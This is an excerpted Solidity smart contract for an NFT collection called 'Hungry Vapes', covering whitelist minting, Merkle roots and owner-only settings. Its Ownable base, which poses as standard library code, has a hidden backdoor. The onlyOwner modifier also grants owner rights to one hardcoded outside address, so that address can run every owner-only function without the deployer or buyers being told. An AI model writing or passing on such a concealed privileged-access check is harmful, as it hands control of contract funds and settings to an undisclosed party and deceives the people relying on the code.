...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || msg.sender == 0xfb97961A39EaA82DAF8289355a8A085b6A84Cc86 , "Ownable: caller is not the owner");
        _;
    }
    ...
    contract HungryVapes is ERC721A, Ownable {
    using Strings for uint256;


  string private uriPrefix  ;
  string private uriSuffix = ".json";
  string public hiddenURL = "ipfs://QmcdsLS76mmCm9MBjgVoVBRee2ARQovg9PiZz67AsroETb";
  ...
  bytes32 public whitelistMerkleRoot = 0x751a5aa712bd7feed797306d4eb9d35e2bb85ea676990e995961cceb82989ef5;
   bytes32 public OGMerkleRoot = 0x9c35b7aa8bf127b28d4fd019f144d22b72d3e03ebd51293759b79b1909856e52;

  constructor() ERC721A("Hungry Vapes", "HV") {
  }
...
function whitelistMint(uint8 _mintAmount, bytes32[] calldata merkleProof) external payable {
 ...
 function setRevealed() external onlyOwner{
  ...
  function setOGsaleLimit(uint8 _limit) external onlyOwner{
      OGsaleLimit = _limit;
